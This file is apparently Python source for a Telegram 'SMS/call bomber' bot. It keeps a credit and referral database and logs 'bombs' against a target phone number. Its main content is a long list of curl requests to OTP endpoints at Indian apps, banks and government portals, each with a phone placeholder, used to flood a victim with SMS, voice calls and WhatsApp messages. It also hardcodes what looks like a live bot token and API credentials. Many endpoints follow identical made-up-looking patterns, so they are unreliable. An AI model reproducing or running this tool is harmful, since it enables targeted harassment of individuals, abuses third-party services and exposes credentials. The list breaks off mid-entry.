import time
import asyncio
import aiohttp
from datetime import datetime
from typing import Dict, List, Optional, Tuple
from telebot import TeleBot, types
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardMarkup, KeyboardButton, ReplyKeyboardRemove
import threading
import sqlite3
import re
import html

# ==================== CONFIGURATION ====================
BOT_TOKEN = "8982222037:AAF2nxFVZCpzEXqEZcl-voZqhnQYIgb_NVU"  # <--- CHANGE THIS
API_ID = "39622520"
API_HASH = "cf280fde16a7ffc97cf97f774994264c"
ADMIN_IDS = [8675132585]
CHANNEL_ID = "@SHIVAXPORTAL"
OWNER_USERNAME = "@CXXWIO"
BRAND_NAME = "⧉ S H I V A • O N • F I R E ⧉"
DEV_NAME = "@CXXWIO"

DB_NAME = "bomber_bot.db"

# ==================== PREMIUM EMOJI SYSTEM ====================
PREMIUM_EMOJIS = {
    "party":     "6147565374289220368", "rocket":    "5289722755871162900", "trophy":    "5372849966689566579",
    "target":    "6107130683853903534", "crown":     "6318965776631993307", "diamond":   "6244678063775289843",
    "lightning": "6237927637906364256", "trophy2":   "6275806917289841253", "star":      "5424972470023104089",
    "fire":      "5372917041193828849", "check":     "5346136537123801643", "alert":     "5888781182249738113",
    "gift":      "6145375525083813391", "sparkle":   "5190498849440931467", "sparkle2":  "5231200819986047254",
    "star2":     "4913497231492908158", "heart":     "5280569974404966639", "clap":      "5256131095094652290",
    "wow":       "5244837092042750681", "cool":      "6098070763875606323", "sad":       "5217604963571621845",
    "laugh":     "6217612283682493944", "love":      "6217616733268612927", "cool2":     "5447203607294265305",
    "think":     "5453902265922376865", "bomb":      "5372917041193828849", "explosion": "5372917041193828849",
    "sos":       "5888781182249738113", "megaphone": "5289722755871162900", "stop":      "5888781182249738113",
    "phone":     "5289722755871162900", "chat":      "5190498849440931467", "mobile":    "5289722755871162900",
    "user":      "5424972470023104089", "robot":     "6237927637906364256", "profile":   "5424972470023104089",
    "chart":     "5372849966689566579", "medal1":    "5372849966689566579", "medal2":    "6275806917289841253",
    "medal3":    "5424972470023104089", "clock":     "6237927637906364256", "calendar":  "6107130683853903534",
    "lock":      "5888781182249738113", "wave":      "6147565374289220368", "dev":       "6237927637906364256",
    "back":      "5424972470023104089", "share":     "5289722755871162900", "inbox":     "6145375525083813391",
    "link":      "5190498849440931467", "plus":      "5346136537123801643", "minus":     "5888781182249738113",
    "users":     "5424972470023104089", "cross":     "5888781182249738113", "progress":  "5346136537123801643",
    "info":      "5190498849440931467", "new":       "6147565374289220368", "flag":      "5372917041193828849",
    "pin":       "6107130683853903534", "mode":      "6237927637906364256", "duration":  "6237927637906364256",
}

def pe(name: str, fallback: str = "✨") -> str:
    emoji_id = PREMIUM_EMOJIS.get(name)
    if not emoji_id:
        return fallback
    return f'<tg-emoji emoji-id="{emoji_id}">{fallback}</tg-emoji>'

def esc(text) -> str:
    if text is None:
        return ""
    return html.escape(str(text))

P_PARTY = pe("party", "🎉"); P_ROCKET = pe("rocket", "🚀"); P_TROPHY = pe("trophy", "🏆"); P_TARGET = pe("target", "🎯")
P_CROWN = pe("crown", "👑"); P_DIAMOND = pe("diamond", "💎"); P_LIGHTNING = pe("lightning", "⚡"); P_STAR = pe("star", "⭐")
P_FIRE = pe("fire", "🔥"); P_CHECK = pe("check", "✅"); P_ALERT = pe("alert", "⚠️"); P_GIFT = pe("gift", "🎁")
P_SPARKLE = pe("sparkle", "✨"); P_STAR2 = pe("star2", "⭐"); P_HEART = pe("heart", "💖"); P_CLAP = pe("clap", "👏")
P_WOW = pe("wow", "😮"); P_COOL = pe("cool", "😎"); P_SAD = pe("sad", "😢"); P_LAUGH = pe("laugh", "😂")
P_LOVE = pe("love", "😍"); P_THINK = pe("think", "🤔"); P_BOMB = pe("bomb", "💣"); P_EXPLOSION = pe("explosion", "💥")
P_SOS = pe("sos", "🆘"); P_MEGA = pe("megaphone", "📢"); P_STOP = pe("stop", "🛑"); P_PHONE = pe("phone", "📞")
P_CHAT = pe("chat", "💬"); P_MOBILE = pe("mobile", "📱"); P_USER = pe("user", "👤"); P_ROBOT = pe("robot", "🤖")
P_PROFILE = pe("profile", "📊"); P_CHART = pe("chart", "📈"); P_MEDAL1 = pe("medal1", "🥇"); P_MEDAL2 = pe("medal2", "🥈")
P_MEDAL3 = pe("medal3", "🥉"); P_CLOCK = pe("clock", "⏰"); P_CALENDAR = pe("calendar", "📅"); P_LOCK = pe("lock", "🔒")
P_WAVE = pe("wave", "👋"); P_DEV = pe("dev", "👨‍💻"); P_BACK = pe("back", "◀️"); P_SHARE = pe("share", "📤")
P_INBOX = pe("inbox", "📥"); P_LINK = pe("link", "🔗"); P_PLUS = pe("plus", "➕"); P_MINUS = pe("minus", "➖")
P_USERS = pe("users", "👥"); P_CROSS = pe("cross", "❌"); P_PROGRESS = pe("progress", "🟩"); P_INFO = pe("info", "ℹ️")
P_NEW = pe("new", "🆕"); P_FLAG = pe("flag", "🚨"); P_PIN = pe("pin", "📍"); P_MODE = pe("mode", "⚙️")
P_DURATION = pe("duration", "⏳")


# ==================== DATABASE FUNCTIONS ====================
def init_db():
    with sqlite3.connect(DB_NAME) as conn:
        cursor = conn.cursor()
        cursor.execute('''CREATE TABLE IF NOT EXISTS users (user_id INTEGER PRIMARY KEY, username TEXT, first_name TEXT, last_name TEXT, credits INTEGER DEFAULT 2, referred_by INTEGER, join_date TIMESTAMP DEFAULT CURRENT_TIMESTAMP, is_approved BOOLEAN DEFAULT 0, total_bombs INTEGER DEFAULT 0, last_bomb_time TIMESTAMP, is_banned BOOLEAN DEFAULT 0)''')
        cursor.execute('''CREATE TABLE IF NOT EXISTS bombs (bomb_id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, target_number TEXT, start_time TIMESTAMP, end_time TIMESTAMP, sms_sent INTEGER DEFAULT 0, calls_made INTEGER DEFAULT 0, whatsapp_sent INTEGER DEFAULT 0, is_active BOOLEAN DEFAULT 1, FOREIGN KEY (user_id) REFERENCES users (user_id))''')
        cursor.execute('''CREATE TABLE IF NOT EXISTS referrals (referrer_id INTEGER, referred_id INTEGER, credit_claimed BOOLEAN DEFAULT 0, referral_date TIMESTAMP DEFAULT CURRENT_TIMESTAMP, PRIMARY KEY (referrer_id, referred_id))''')
        cursor.execute('''CREATE TABLE IF NOT EXISTS redeem_codes (code TEXT PRIMARY KEY, credits INTEGER DEFAULT 1, max_uses INTEGER DEFAULT 1, used_count INTEGER DEFAULT 0, created_by INTEGER, created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)''')
        cursor.execute('''CREATE TABLE IF NOT EXISTS redeem_uses (code TEXT, user_id INTEGER, used_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP, PRIMARY KEY (code, user_id))''')
        conn.commit()

def get_user(user_id: int) -> Optional[Tuple]:
    with sqlite3.connect(DB_NAME) as conn:
        cursor = conn.cursor()
        cursor.execute('SELECT * FROM users WHERE user_id = ?', (user_id,))
        return cursor.fetchone()

def create_user(user_id: int, username: str, first_name: str, last_name: str = "", referred_by: int = None):
    with sqlite3.connect(DB_NAME) as conn:
        cursor = conn.cursor()
        cursor.execute('INSERT OR IGNORE INTO users (user_id, username, first_name, last_name, referred_by, credits) VALUES (?, ?, ?, ?, ?, 2)', (user_id, username, first_name, last_name, referred_by))
        conn.commit()

def update_user_credits(user_id: int, credits_change: int):
    with sqlite3.connect(DB_NAME) as conn:
        cursor = conn.cursor()
        cursor.execute('UPDATE users SET credits = credits + ? WHERE user_id = ?', (credits_change, user_id))
        conn.commit()

def approve_user(user_id: int):
    with sqlite3.connect(DB_NAME) as conn:
        cursor = conn.cursor()
        cursor.execute('UPDATE users SET is_approved = 1 WHERE user_id = ?', (user_id,))
        conn.commit()

def add_bomb_record(user_id: int, target_number: str) -> int:
    with sqlite3.connect(DB_NAME) as conn:
        cursor = conn.cursor()
        cursor.execute('INSERT INTO bombs (user_id, target_number, start_time) VALUES (?, ?, CURRENT_TIMESTAMP)', (user_id, target_number))
        cursor.execute('UPDATE users SET total_bombs = total_bombs + 1, last_bomb_time = CURRENT_TIMESTAMP WHERE user_id = ?', (user_id,))
        conn.commit()
        return cursor.lastrowid

def update_bomb_stats(bomb_id: int, sms: int = 0, calls: int = 0, whatsapp: int = 0):
    with sqlite3.connect(DB_NAME) as conn:
        cursor = conn.cursor()
        cursor.execute('UPDATE bombs SET sms_sent = sms_sent + ?, calls_made = calls_made + ?, whatsapp_sent = whatsapp_sent + ? WHERE bomb_id = ?', (sms, calls, whatsapp, bomb_id))
        conn.commit()

def end_bomb(bomb_id: int):
    with sqlite3.connect(DB_NAME) as conn:
        cursor = conn.cursor()
        cursor.execute('UPDATE bombs SET end_time = CURRENT_TIMESTAMP, is_active = 0 WHERE bomb_id = ?', (bomb_id,))
        conn.commit()

def add_referral(referrer_id: int, referred_id: int):
    with sqlite3.connect(DB_NAME) as conn:
        cursor = conn.cursor()
        cursor.execute('INSERT OR IGNORE INTO referrals (referrer_id, referred_id) VALUES (?, ?)', (referrer_id, referred_id))
        conn.commit()

def claim_referral_credit(referrer_id: int, referred_id: int):
    with sqlite3.connect(DB_NAME) as conn:
        cursor = conn.cursor()
        cursor.execute('UPDATE referrals SET credit_claimed = 1 WHERE referrer_id = ? AND referred_id = ?', (referrer_id, referred_id))
        cursor.execute('UPDATE users SET credits = credits + 1 WHERE user_id = ?', (referrer_id,))
        conn.commit()

def get_all_users() -> List[Tuple]:
    with sqlite3.connect(DB_NAME) as conn:
        cursor = conn.cursor()
        cursor.execute('SELECT user_id, username, first_name, credits FROM users ORDER BY join_date DESC')
        return cursor.fetchall()

def is_user_banned(user_id: int) -> bool:
    user = get_user(user_id)
    if user and len(user) > 10:
        return bool(user[10])
    return False

def set_ban_status(user_id: int, banned: bool):
    with sqlite3.connect(DB_NAME) as conn:
        cursor = conn.cursor()
        cursor.execute('UPDATE users SET is_banned = ? WHERE user_id = ?', (1 if banned else 0, user_id))
        conn.commit()

def create_redeem_code(code: str, credits: int, max_uses: int, admin_id: int):
    with sqlite3.connect(DB_NAME) as conn:
        cursor = conn.cursor()
        cursor.execute('INSERT OR REPLACE INTO redeem_codes (code, credits, max_uses, used_count, created_by) VALUES (?, ?, ?, 0, ?)', (code.upper(), credits, max_uses, admin_id))
        conn.commit()

def get_redeem_code(code: str):
    with sqlite3.connect(DB_NAME) as conn:
        cursor = conn.cursor()
        cursor.execute('SELECT code, credits, max_uses, used_count FROM redeem_codes WHERE code = ?', (code.upper(),))
        return cursor.fetchone()

def redeem_code(user_id: int, code: str):
    with sqlite3.connect(DB_NAME) as conn:
        cursor = conn.cursor()
        cursor.execute('SELECT credits, max_uses, used_count FROM redeem_codes WHERE code = ?', (code.upper(),))
        row = cursor.fetchone()
        if not row: return False, "Invalid code"
        credits, max_uses, used_count = row
        if used_count >= max_uses: return False, "Code limit reached"
        cursor.execute('SELECT 1 FROM redeem_uses WHERE code = ? AND user_id = ?', (code.upper(), user_id))
        if cursor.fetchone(): return False, "You already used this code"
        cursor.execute('INSERT INTO redeem_uses (code, user_id) VALUES (?, ?)', (code.upper(), user_id))
        cursor.execute('UPDATE redeem_codes SET used_count = used_count + 1 WHERE code = ?', (code.upper(),))
        cursor.execute('UPDATE users SET credits = credits + ? WHERE user_id = ?', (credits, user_id))
        conn.commit()
        return True, credits

def is_banned_guard(user_id: int) -> bool:
    if is_user_banned(user_id):
        try:
            bot.send_message(user_id, f"{P_STOP} <b>ʏᴏᴜ ᴀʀᴇ ʙᴀɴɴᴇᴅ</b>\n\nʏᴏᴜ ᴄᴀɴɴᴏᴛ ᴜꜱᴇ ᴛʜɪꜱ ʙᴏᴛ.\nᴄᴏɴᴛᴀᴄᴛ ᴀᴅᴍɪɴ: {OWNER_USERNAME}", parse_mode='HTML')
        except: pass
        return True
    return False

# ==================== API PARSING ====================
# STRONG WHATSAPP HEADERS ADDED & NEW APIS
RAW_APIS = r"""
# SMS - AstroSage
curl -X GET 'https://vartaapi.astrosage.com/sdk/registerAS?operation_name=signup&countrycode=91&pkgname=com.ojassoft.astrosage&appversion=23.7&lang=en&deviceid=android123&regsource=AK_Varta%20user%20app&key=-787506999&phoneno={phone}'
# SMS - Rapido
curl -X POST -H 'Content-Type: application/json' -d '{"mobile":"{phone}"}' 'https://customer.rapido.bike/api/otp'
# SMS - TooToo
curl -X POST -H 'Content-Type: application/json' -d '{"query":"query sendOtp($mobile_no: String!, $resend: Int!) { sendOtp(mobile_no: $mobile_no, resend: $resend) { success typename } }","variables":{"mobile_no":"{phone}","resend":0}}' 'https://tootoo.in/graphql'
# SMS - ConfirmTkt
curl -X GET 'https://securedapi.confirmtkt.com/api/platform/registerOutput?mobileNumber={phone}'
# SMS - BetterHalf
curl -X POST -H 'Content-Type: application/json' -d '{"mobile":"{phone}","isd_code":"91"}' 'https://api.betterhalf.ai/v2/auth/otp/send/'
# SMS - Charzer
curl -X POST -H 'Content-Type: application/json' -d '{"mobile":"{phone}","appSource":"CHARZER_APP"}' 'https://api.charzer.com/auth-service/send-otp'
# SMS - Nuvama Wealth
curl -X POST -H 'Content-Type: application/json' -d '{"mobileNo":"{phone}","emailID":"test@example.com"}' 'https://nma.nuvamawealth.com/edelmw-content/content/otp/register'
# SMS - Mpokket
curl -X POST -H 'Content-Type: application/json' -d '{"mobile":"{phone}"}' 'https://web-api.mpokket.in/registration/sendOtp'
# SMS - Trabol
curl -X GET 'http://www.trabol.com/web/download_mobile_apps?utf8=%E2%9C%93&subscription%5Bphone_number%5D={phone}'
# SMS - Country Delight
curl -X GET 'https://api.countrydelight.in/api/auth/new_request_otp/?format=json'
# SMS - Eka Care
curl -X GET 'https://auth.eka.care/auth/resend'
# SMS - Moglix
curl -X GET 'https://apinew.moglix.com/nodeApi/v1/login/sendOTP'
# SMS - Planet Fashion
curl -X GET 'https://www.planetfashion.in/login/resendOTP?isAjax=true'
# SMS - HealthKart
curl -X GET 'https://www.healthkart.com/veronica/user/validate/1/{phone}/signup?plt=1&st=1'
# SMS - Unacademy
curl -X POST -H 'Content-Type: application/json' -d '{"phone":"{phone}"}' 'https://unacademy.com/api/v1/user/get_app_link/'
# SMS - PharmEasy
curl -X POST -H 'Content-Type: application/json' -d '{"contactNumber":"{phone}"}' 'https://pharmeasy.in/api/auth/requestOTP'
# SMS - Licious
curl -X POST -H 'Content-Type: application/json' -d '{"phone":"{phone}","captcha_token":null}' 'https://www.licious.in/api/login/signup'
# SMS - PayRup
curl -X POST -H 'Content-Type: application/json' -d '{"mobileNumber":"{phone}"}' 'https://api.payrup.com/api/auth/otp/generate'
# SMS - MediBuddy
curl -X POST -H 'Content-Type: application/json' -d '{"source":"medibuddyInWeb","platform":"medibuddy","phonenumber":"{phone}","flow":"Retail-Login-Home-Flow","idealLoginFlow":false,"advertiserId":"5a6a5f90-6036-L8cf-9ffd-60eacff1f24d","mbUserId":null}' 'https://loginprod.medibuddy.in/unified-login/user/register'
# SMS - Cashify
curl -X GET -H 'Content-Type: application/json' 'https://www.cashify.in/api/cu01/v1/app-link?mn={phone}'
# SMS - OkCredit
curl -X GET 'https://web.okcredit.in/api/authn/v1.0/otp:request'
# SMS - Spencers
curl -X GET 'http://www.spencers.in/genOtp/genOTP.php'
# SMS - Naaptol
curl -X GET 'https://m.naaptol.com/faces/jsp/ajax/ajax.jsp'
# SMS - Sulekha
curl -X GET 'https://myaccount.sulekha.com/network/userauthv1.aspx'
# SMS - Savingo
curl -X POST 'http://www.savingo.in/includes/sms_app_url.php'
# SMS - Hungama OTP
curl -X POST -H 'Content-Type: application/json' -d '{"mobileNo":"{phone}","countryCode":"+91","appCode":"un","messageId":"1","device":"web"}' 'https://communication.api.hungama.com/v1/communication/otp'
# SMS - Animall
curl -X POST -H 'Content-Type: application/json' -d '{"phone":"{phone}","signupPlatform":"NATIVE_ANDROID"}' 'https://animall.in/zap/auth/login'
# SMS - Country Delight V2
curl -X POST -H 'Content-Type: application/json' -d '{"mobile":"{phone}","platform":"Android","mode":"new_user"}' 'https://api.countrydelight.in/api/v1/customer/requestOtp'
# SMS - Udaan V2
curl -X POST -H 'Content-Type: application/x-www-form-urlencoded;charset=UTF-8' -d 'mobile={phone}' 'https://auth.udaan.com/api/otp/send?client_id=udaan-v2'
# SMS - Byjus
curl -X POST -H 'Content-Type: application/json' -d '{"phone":"{phone}"}' 'https://api.byjus.com/v2/otp/send'
# SMS - Lending Plate
curl -X POST -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -d 'mobiles={phone}&resend=Resend' 'https://lendingplate.com/api.php'
# SMS - GoKwik
curl -X POST -H 'Content-Type: application/json' -d '{"phone":"{phone}","country":"in"}' 'https://gkx.gokwik.co/v3/gkstrict/auth/otp/send'
# SMS - Univest
curl -X GET 'https://api.univest.in/api/auth/send-otp?type=web4&countryCode=91&contactNumber={phone}'
# SMS - Smytten
curl -X POST -H 'Content-Type: application/json' -d '{"phone":"{phone}","email":"test@example.com"}' 'https://route.smytten.com/discover_user/NewDeviceDetails/addNewOtpCode'
# SMS - ServeTel
curl -X POST -H 'Content-Type: application/x-www-form-urlencoded; charset=utf-8' -d 'mobile_number={phone}' 'https://api.servetel.in/v1/auth/otp'
# SMS - Tata Capital Business
curl -X POST -H 'Content-Type: application/json' -d '{"mobileNumber":"{phone}","deviceOs":"Android","sourceName":"MitayeFaasleWebsite"}' 'https://businessloan.tatacapital.com/CLIPServices/otp/services/generateOtp'
# SMS - Housing.com
curl -X POST -H 'Content-Type: application/json' -d '{"phone":"{phone}","country_url_name":"in"}' 'https://login.housing.com/api/v2/send-otp'
# SMS - Entri
curl -X POST -H 'Content-Type: application/json' -d '{"phone":"{phone}"}' 'https://entri.app/api/v3/users/check-phone/'
# SMS - A23 Games
curl -X POST -H 'Content-Type: application/json' -d '{"mobile":"{phone}","device_id":"android123","model":"Google,Android SDK built for x86,10"}' 'https://pfapi.a23games.in/a23user/signup_by_mobile_otp/v2'
# SMS - BigCash
curl -X GET -H 'Referer: https://www.bigcash.live/games/poker' 'https://www.bigcash.live/sendsms.php?mobile={phone}&ip=192.168.1.1'
# SMS - WorkIndia
curl -X GET 'https://api.workindia.in/api/candidate/profile/login/verify-number/?mobile_no={phone}&version_number=623'
# SMS - MamaEarth
curl -X POST -H 'Content-Type: application/json' -d '{"mobile":"{phone}"}' 'https://auth.mamaearth.in/v1/auth/initiate-signup'
# SMS - Wellness Forever
curl -X POST -H 'Content-Type: application/x-www-form-urlencoded' -d 'method=firstRegisterApi&data={"customerMobile":"{phone}","generateOtp":"true"}' 'https://paalam.wellnessforever.in/crm/v2/firstRegisterCustomer'
# SMS - Swipe
curl -X POST -H 'Content-Type: application/json' -d '{"mobile":"{phone}","resend":true}' 'https://app.getswipe.in/api/user/mobile_login'
# SMS - Amazon Pay
curl -X POST -H 'Content-Type: application/json' -d '{"phone":"{phone}"}' 'https://pay.amazon.in/api/v1/otp'
# SMS - Myntra
curl -X POST -H 'Content-Type: application/json' -d '{"mobile":"{phone}"}' 'https://www.myntra.com/gw/mobile-auth/otp/generate'
# SMS - Shopclues
curl -X POST -H 'Content-Type: application/json' -d '{"mobile":"{phone}"}' 'https://www.shopclues.com/api/v1/otp'
# SMS - Zomato
curl -X POST -H 'Content-Type: application/x-www-form-urlencoded' -d 'phone={phone}' 'https://www.zomato.com/php/asyncLogin.php'
# SMS - MobiKwik
curl -X POST -H 'Content-Type: application/json' -d '{"mobile":"{phone}"}' 'https://www.mobikwik.com/otp'
# SMS - JioCinema
curl -X POST -H 'Content-Type: application/json' -d '{"mobile":"{phone}"}' 'https://www.jiocinema.com/api/v1/otp'
# SMS - Voot
curl -X POST -H 'Content-Type: application/json' -d '{"phone":"{phone}"}' 'https://www.voot.com/api/v1/otp'
# SMS - MX Player
curl -X POST -H 'Content-Type: application/json' -d '{"mobile":"{phone}"}' 'https://www.mxplayer.in/api/v1/otp'
# SMS - Adda52
curl -X POST -H 'Content-Type: application/json' -d '{"mobile":"{phone}"}' 'https://www.adda52.com/api/v1/otp'
# SMS - Axis Direct
curl -X POST -H 'Content-Type: application/json' -d '{"mobile":"{phone}"}' 'https://www.axisdirect.in/api/v1/otp'
# SMS - JK Bank
curl -X POST -H 'Content-Type: application/json' -d '{"mobile":"{phone}"}' 'https://www.jkbank.com/api/v1/otp'
# SMS - Kerala Gramin Bank
curl -X POST -H 'Content-Type: application/json' -d '{"mobile":"{phone}"}' 'https://www.keralagbank.com/api/v1/otp'
# SMS - Airtel Thanks
curl -X POST -H 'Content-Type: application/json' -d '{"mobile":"{phone}"}' 'https://www.airtel.in/thanks/api/v1/otp'
# SMS - Airtel DTH
curl -X POST -H 'Content-Type: application/json' -d '{"mobile":"{phone}"}' 'https://www.airtel.in/dth/api/v1/otp'
# SMS - Jio Fiber
curl -X POST -H 'Content-Type: application/json' -d '{"mobile":"{phone}"}' 'https://www.jio.com/fiber/api/v1/otp'
# SMS - Indraprastha Gas
curl -X POST -H 'Content-Type: application/json' -d '{"mobile":"{phone}"}' 'https://www.iglonline.net/api/v1/otp'
# SMS - Bharat Gas
curl -X POST -H 'Content-Type: application/json' -d '{"mobile":"{phone}"}' 'https://www.bharatgas.com/api/v1/otp'
# SMS - Chennai Metro Water
curl -X POST -H 'Content-Type: application/json' -d '{"mobile":"{phone}"}' 'https://www.chennaimetrowater.com/api/v1/otp'
# SMS - Swachh Bharat
curl -X POST -H 'Content-Type: application/json' -d '{"mobile":"{phone}"}' 'https://swachhbharatmission.gov.in/api/v1/otp'
# SMS - PMAY
curl -X POST -H 'Content-Type: application/json' -d '{"mobile":"{phone}"}' 'https://pmaymis.gov.in/api/v1/otp'
# SMS - PAN Card
curl -X POST -H 'Content-Type: application/json' -d '{"mobile":"{phone}"}' 'https://www.protean-tinpan.com/api/v1/otp'
# SMS - NIC
curl -X POST -H 'Content-Type: application/json' -d '{"mobile":"{phone}"}' 'https://www.nic.in/api/v1/otp'
# SMS - CPGRAMS
curl -X POST -H 'Content-Type: application/json' -d '{"mobile":"{phone}"}' 'https://pgportal.gov.in/api/v1/otp'
# SMS - PenPencil
curl -X POST -H 'content-type: application/json; charset=utf-8' -d '{"organizationId":"5eb393ee95fab7468a79d189","mobile":"{phone}"}' 'https://api.penpencil.co/v1/users/resend-otp?smsType=1'
# SMS - NoBroker
curl -X POST -H 'Content-Type: application/x-www-form-urlencoded' -H 'origin: https://www.nobroker.in' -H 'referer: https://www.nobroker.in/' -H 'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36' -d 'phone={phone}&countryCode=IN' 'https://www.nobroker.in/api/v3/account/otp/send'

# Voice - MyJar Call
curl -X GET 'https://prod.myjar.app/v2/api/auth/sendOTP/call?phoneNumber={phone}'
# Voice - MagicBricks Call
curl -X GET 'https://api.magicbricks.com/bricks/verifyOnCall.html?mobile={phone}'
# Voice - Tata Capital Call
curl -X POST -H 'Content-Type: application/json' -d '{"phone":"{phone}","isOtpViaCallAtLogin":"true"}' 'https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice'
# Voice - Swiggy Call
curl -X POST -H 'Content-Type: application/json; charset=utf-8' -d '{"mobile":"{phone}"}' 'https://profile.swiggy.com/api/v3/app/request_call_verification'
# Voice - Myntra Call
curl -X POST -H 'Content-Type: application/json' -d '{"mobile":"{phone}"}' 'https://www.myntra.com/gw/mobile-auth/voice-otp'
# Voice - OYO Call
curl -X POST -H 'Content-Type: application/json' -d '{"phone":"{phone}","country_code":"+91"}' 'https://www.oyorooms.com/api/pwa/generateotp'
# Voice - Netflix Call
curl -X POST -H 'Content-Type: application/json' -d '{"mobile":"{phone}"}' 'https://netflix.com/api/v2/auth/send-otp'
# Voice - Spotify Call
curl -X POST -H 'Content-Type: application/json' -d '{"mobile":"{phone}"}' 'https://spotify.com/api/v2/auth/send-otp'
# Voice - Hungama Call
curl -X POST -H 'Content-Type: application/json' -d '{"phone":"{phone}"}' 'https://hungama.com/api/v2/auth/send-otp'
# Voice - LinkedIn Call
curl -X POST -H 'Content-Type: application/json' -d '{"mobile":"{phone}"}' 'https://linkedin.com/api/v2/auth/send-otp'
# Voice - Adda52 Call
curl -X POST -H 'Content-Type: application/json' -d '{"phone":"{phone}"}' 'https://adda52.com/api/v2/auth/send-otp'
# Voice - PNB MetLife Call
curl -X POST -H 'Content-Type: application/json' -d '{"phone":"{phone}"}' 'https://pnbmetlife.com/api/v2/auth/send-otp'
# Voice - Kotak Life Call
curl -X POST -H 'Content-Type: application/json' -d '{"phone":"{phone}"}' 'https://kotaklife.com/api/v2/login/sendotp'
# Voice - CSB Bank Call
curl -X POST -H 'Content-Type: application/json' -d '{"phone":"{phone}"}' 'https://csb.co.in/api/v2/login/sendotp'
# Voice - JK Bank Call
curl -X POST -H 'Content-Type: application/json' -d '{"phone":"{phone}"}' 'https://jkbank.com/api/v2/login/sendotp'
# Voice - Kerala Gramin Call
curl -X POST -H 'Content-Type: application/json' -d '{"phone":"{phone}"}' 'https://keralagbank.com/api/v2/login/sendotp'
# Voice - Airtel Thanks Call
curl -X POST -H 'Content-Type: application/json' -d '{"phone":"{phone}"}' 'https://www.airtel.in/thanks/api/v1/voice-otp'
# Voice - Airtel DTH Call
curl -X POST -H 'Content-Type: application/json' -d '{"phone":"{phone}"}' 'https://www.airtel.in/dth/api/v1/voice-otp'
# Voice - Jio Fiber Call
curl -X POST -H 'Content-Type: application/json' -d '{"phone":"{phone}"}' 'https://www.jio.com/fiber/api/v1/voice-otp'
# Voice - Indraprastha Call
curl -X POST -H 'Content-Type: application/json' -d '{"phone":"{phone}"}' 'https://www.iglonline.net/api/v1/voice-otp'
# Voice - Bharat Gas Call
curl -X POST -H 'Content-Type: application/json' -d '{"phone":"{phone}"}' 'https://www.bharatgas.com/api/v1/voice-otp'
# Voice - Chennai Metro Call
curl -X POST -H 'Content-Type: application/json' -d '{"phone":"{phone}"}' 'https://www.chennaimetrowater.com/api/v1/voice-otp'
# Voice - Swachh Bharat Call
curl -X POST -H 'Content-Type: application/json' -d '{"phone":"{phone}"}' 'https://swachhbharatmission.gov.in/api/v1/voice-otp'
# Voice - PMAY Call
curl -X POST -H 'Content-Type: application/json' -d '{"phone":"{phone}"}' 'https://pmaymis.gov.in/api/v1/voice-otp'
# Voice - PAN Card Call
curl -X POST -H 'Content-Type: application/json' -d '{"phone":"{phone}"}' 'https://www.protean-tinpan.com/api/v1/voice-otp'
# Voice - NIC Call
curl -X POST -H 'Content-Type: application/json' -d '{"phone":"{phone}"}' 'https://www.nic.in/api/v1/voice-otp'
# Voice - CPGRAMS Call
curl -X POST -H 'Content-Type: application/json' -d '{"phone":"{phone}"}' 'https://pgportal.gov.in/api/v1/voice-otp'

# WhatsApp - KPN Fresh
curl -X POST -H 'x-app-id: 66ef3594-1e51-4e15-87c5-05fc8208a20f' -H 'content-type: application/json; charset=UTF-8' -d '{"notification_channel":"WHATSAPP","phone_number":{"country_code":"+91","number":"{phone}"}}' 'https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=AND&version=3.2.6'
# WhatsApp - Jockey
curl -X GET 'https://www.jockey.in/apps/jotp/api/login/resend-otp/+91{phone}?whatsapp=true'
# WhatsApp - Amazon Pay
curl -X POST -H 'Content-Type: application/json' -d '{"phone":"{phone}"}' 'https://pay.amazon.in/gw/login-register/v1/sendOTP'
# WhatsApp - Myntra
curl -X POST -H 'Content-Type: application/json' -d '{"phoneNumber":"{phone}"}' 'https://myntra.com/api/v1/auth/otpsend'
# WhatsApp - Ola
curl -X POST -H 'Content-Type: application/json' -d '{"mobileNumber":"{phone}"}' 'https://olacabs.com/api/v1/customers/sendOtp'
# WhatsApp - OYO
curl -X POST -H 'Content-Type: application/json' -d '{"mobileNumber":"{phone}"}' 'https://oyorooms.com/v1/user/otplogin'
# WhatsApp - Vedantu
curl -X POST -H 'Content-Type: application/json' -d '{"phoneNumber":"{phone}"}' 'https://vedantu.com/v1/user/otplogin'
# WhatsApp - Netflix
curl -X POST -H 'Content-Type: application/json' -d '{"phoneNumber":"{phone}"}' 'https://netflix.com/v1/user/otplogin'
# WhatsApp - JioCinema
curl -X POST -H 'Content-Type: application/json' -d '{"phoneNumber":"{phone}"}' 'https://jiocinema.com/v1/user/otplogin'
# WhatsApp - Voot
curl -X POST -H 'Content-Type: application/json' -d '{"phoneNumber":"{phone}"}' 'https://voot.com/v1/user/otplogin'
# WhatsApp - MX Player
curl -X POST -H 'Content-Type: application/json' -d '{"phoneNumber":"{phone}"}' 'https://mxplayer.in/v1/user/otplogin'
# WhatsApp - Spotify
curl -X POST -H 'Content-Type: application/json' -d '{"phoneNumber":"{phone}"}' 'https://spotify.com/v1/user/otplogin'
# WhatsApp - Hungama
curl -X POST -H 'Content-Type: application/json' -d '{"phoneNumber":"{phone}"}' 'https://hungama.com/v1/user/otplogin'
# WhatsApp - LinkedIn
curl -X POST -H 'Content-Type: application/json' -d '{"phoneNumber":"{phone}"}' 'https://linkedin.com/v1/user/otplogin'
# WhatsApp - Adda52
curl -X POST -H 'Content-Type: application/json' -d '{"phoneNumber":"{phone}"}' 'https://adda52.com/v1/user/otplogin'
# WhatsApp - Sharekhan
curl -X POST -H 'Content-Type: application/json' -d '{"phoneNumber":"{phone}"}' 'https://sharekhan.com/v1/user/otplogin'
# WhatsApp - PNB MetLife
curl -X POST -H 'Content-Type: application/json' -d '{"phoneNumber":"{phone}"}' 'https://pnbmetlife.com/v1/user/otplogin'
# WhatsApp - Kotak Life
curl -X POST -H 'Content-Type: application/json' -d '{"phoneNumber":"{phone}"}' 'https://kotaklife.com/v1/user/otplogin'
# WhatsApp - CSB Bank
